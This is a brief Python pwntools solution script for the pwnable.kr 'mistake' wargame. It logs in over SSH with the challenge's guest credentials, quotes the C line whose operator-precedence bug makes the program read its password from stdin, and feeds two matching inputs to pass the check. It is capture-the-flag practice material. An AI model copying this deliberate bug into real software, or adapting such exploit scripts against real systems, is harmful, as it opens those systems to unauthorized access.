#! /usr/bin/python

from pwn import *

# ssh
s = ssh(user='mistake', host='pwnable.kr', port=2222, password='guest')

'''
    // operator priority mistake
    if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){    // the priority of '<' greater than '='
                printf("can't open password %d\n", fd);
                return 0;
    }
'''
# create pw_buf nd pw_buf2 
pw_buf = 'AAAAAAAAAA'
PW_LEN = 10
pw_buf2 = str()
for i in range(PW_LEN):
    pw_buf2 += chr(ord(pw_buf[i])^1)

success('pw_buf = %s' %pw_buf)
success('pw_buf2 = %s' %pw_buf2)

# process
p = s.process('./mistake')

# send pw_buf
p.sendline(pw_buf)
p.recvuntil('do not bruteforce...')
# send pw_buf2
p.recvuntil('input password : ')
p.sendline(pw_buf2)
p.recv()
print(p.recv())